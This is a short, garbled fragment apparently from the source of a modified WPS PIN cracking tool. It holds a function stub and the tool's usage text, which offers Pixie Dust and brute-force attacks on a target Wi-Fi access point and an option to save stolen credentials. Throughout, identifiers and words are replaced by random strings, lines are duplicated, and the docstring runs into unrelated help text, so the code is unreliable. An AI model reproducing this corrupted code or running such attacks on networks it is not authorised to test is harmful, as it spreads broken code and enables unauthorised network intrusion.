    def PabSCveCiuSokokFBcGwLLJOZbPBCgEB(self, XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, f_half, delay=None):
        """
        @f_half â€” 4-character NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR
        @f_half â€” 4-character NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR
        @s_half â€” 3-character NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR
            Truncate NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR with the specified length
            @tpDygRvjEWOVwDvOuGOTJvvFzcqMpOjJ â€” input NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR
            @length â€” length of output NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR
OneShotPin 0.0.2 (c) 2017 rofl0r, modded by FARHAN 
%(prog)tpDygRvjEWOVwDvOuGOTJvvFzcqMpOjJ <arguments>
Required arguments:
    -bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl, --interface=<wlan0>  : Name of the interface to use
Optional arguments:
    -b, --XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb=<mac>        : BSSID of the target AP
    -p, --FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF=<wps pin>      : Use the specified FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF (arbitrary NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR or 4/8 digit FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
Advanced arguments:
    -d, --delay=<n>          : Set the delay between FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-ibGLmqZzMCJImSMbHIfnnvLQblhNyGpw     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in NtuuZHQTHwRizxEbJxqNgaDdfbRvYxLV loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    -v, --KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE            : Verbose output
Example:
    %(prog)tpDygRvjEWOVwDvOuGOTJvvFzcqMpOjJ -bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl wlan0 -b 00:90:4C:C1:AC:21 -K
